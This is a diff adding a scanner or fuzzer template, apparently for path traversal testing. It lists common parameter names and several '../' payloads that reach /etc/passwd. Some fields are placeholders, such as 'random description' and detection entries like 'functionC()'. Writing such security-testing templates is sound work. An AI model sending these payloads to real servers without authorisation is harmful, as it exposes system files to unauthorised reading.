@@ -1,0 +1,41 @@
+id: path-traversal-basic
+
+attack-type: fuzz
+level: 2
+info:
+  name: Path Traversal Basic
+  author: Ahmad
+  severity: High
+  description: random description
+  category: Path Traversal
+
+variables:
+  - filename
+  - file
+  - image
+  - path
+  - dir
+  - page
+  - template
+  - config
+
+payloads:
+  - >-
+    ../../../etc/passwd
+  - >-
+    ../../../../../../etc/passwd
+  - >-
+    ../../../../../etc/passwd
+  - >-
+    ../../../../etc/passwd
+
+requests:
+  - detections:
+      - >-
+        isVulnerableToPathTraversal()
+      - >-
+        isXSSDetected()
+      - >-
+        functionC()
+      - >-
+        functionD()
